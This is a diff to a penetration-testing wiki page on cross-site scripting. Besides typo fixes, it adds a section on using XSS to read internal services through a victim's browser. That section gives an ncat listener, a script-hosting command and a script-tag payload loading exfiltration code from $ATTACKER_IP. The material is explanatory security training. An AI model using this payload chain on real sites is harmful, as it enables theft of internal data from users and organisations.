@@ -13,7 +13,7 @@ Executing arbitrary code on a victim's browser can allow an attacker to perform 
 
 There are three major types of XSS:
 
-* Stored: the user input is stored on the website. It usually happens on user profiles, forums, chats and so on were the user content is permanently (or temporarily) stored. Attackers can inject malicious payloads and every user browsing the infected page will be affected. This is one of the most dangerous forms of XSS because exploitation requires no phishing and it can affect many users. XSS on pages that only the attacker's user has the right to browse (e.g. user settings page) are called self-XSS and are considered to have a close to 0 impact since it's theoretically can't affect other users.
+* Stored: the user input is stored on the website. It usually happens on user profiles, forums, chats and so on where the user content is permanently (or temporarily) stored. Attackers can inject malicious payloads and every user browsing the infected page will be affected. This is one of the most dangerous forms of XSS because exploitation requires no phishing and it can affect many users. XSS on pages that only the attacker's user has the right to browse (e.g. user settings page) are called self-XSS and are considered to have a close to 0 impact since it theoretically can't affect other users.
 * Reflected: the user input is reflected but not stored. It usually happens on search forms, login pages and pages that reflect content for one response only. When the reflected vulnerable input is in the URI (`http://www.target.com/search.php?keyword=INJECTION`) attackers can craft a malicious URI and send it to the victims hoping they will browse it. This form of XSS usually requires phishing and attackers can be limited in the length of the malicious payload (cf. [this](https://serpstat.com/blog/how-long-should-be-the-page-url-length-for-seo/)).
 * DOM-based: while stored and reflected XSS attacks exploit vulnerabilities in the server-side code, a DOM-based XSS exploits client-side ones (e.g. JavaScript used to help dynamically render a page). DOM-based XSS usually affect user inputs that are temporarily reflected, just like reflected XSS attacks.
 
@@ -44,6 +44,37 @@ The following payload is used for testing [SQL injections](sqli.md), XSS (Cross-
 
 Tools like [XSStrike](https://github.com/s0md3v/XSStrike) (Python), [XSSer](https://github.com/epsylon/xsser) (Python), and [Dalfox](https://github.com/hahwul/dalfox) (Go) can also help in finding and exploiting XSS vulnerable input vectors by fuzzing them with unique payloads and then searching for unique patterns in the responses.
 
+### Reading internal resources
+
+An XSS is not limited to `alert()` or cookie theft. The injected script runs inside the victim's browser, which can often reach services the attacker cannot reach directly (e.g. an admin panel or an API listening on `127.0.0.1`, or an intranet host). The script can request an internal URL and send the response back to the attacker.
+
+[myexfilxss](https://github.com/hack-ita/xss-internal-exfil-poc) is a minimal JavaScript PoC doing exactly that. It reads the internal URL as raw bytes (so html, json, archives or binaries are not corrupted), encodes the response in base64, and sends it back in a single `POST` with `Content-Type: text/plain` (a "simple request", so no CORS preflight is triggered).
+
+First, set the internal URL to read (`uri` variable) and the attacker's IP (`exfil.open(...)` line) in `myexfilxss.js`. Then start a listener and host the script on another port.
+
+```bash
+# Listener receiving the exfiltrated data
+sudo ncat -klvnp 80
+
+# Host the script (port 80 is already used by the listener)
+python3 -m http.server 8000
+```
+
+The script can then be loaded through the XSS (e.g. in a field or header that gets rendered to another user).
+
+```html
+<script src="http://$ATTACKER_IP:8000/myexfilxss.js"></script>
+```
+
+The base64 data is the body of the `POST` request received by the listener, and can be decoded with `base64 -d`.
+
+```bash
+echo '$BASE64_BODY' | base64 -d > response.bin
+```
+
+> [!WARNING]
+> The browser still enforces its security policies. Reading a cross-origin response requires the internal service to be same-origin or to allow it with CORS headers (e.g. `Access-Control-Allow-Origin`), and a restrictive CSP or mixed content (an HTTPS page requesting an HTTP URL) can block the requests. The internal service must also answer a plain `GET` without authentication or additional headers.
+
 ## Resources
 
 [https://xss-game.appspot.com/](https://xss-game.appspot.com/)
@@ -53,3 +84,7 @@ Tools like [XSStrike](https://github.com/s0md3v/XSStrike) (Python), [XSSer](http
 [https://owasp.org/www-community/attacks/DOM_Based_XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
 
 [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
+
+[https://en.hackita.it/articoli/xss/](https://en.hackita.it/articoli/xss/)
+
+[https://github.com/hack-ita/xss-internal-exfil-poc](https://github.com/hack-ita/xss-internal-exfil-poc)
